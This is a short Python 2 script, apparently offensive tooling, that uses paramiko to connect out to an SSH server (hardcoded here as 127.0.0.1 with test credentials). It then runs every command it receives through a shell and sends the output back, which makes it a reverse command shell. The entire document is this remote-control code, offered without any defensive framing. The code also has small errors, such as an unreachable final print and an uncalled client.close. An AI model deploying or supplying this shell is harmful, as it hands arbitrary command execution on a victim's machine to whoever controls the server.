import paramiko
import threading
import subprocess

HOST = '127.0.0.1'
USERNAME = 'test'
PASSWORD = 'test'

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(HOST, username=USERNAME, password=PASSWORD)
chan = client.get_transport().open_session()
chan.send('Shell time!')
while True:
    command = chan.recv(1024)
    try:
        CMD = subprocess.check_output(command, shell=True)
        chan.send(CMD)
    except Exception,e:
        chan.send(str(e))
print chan.recv(1024)
client.close
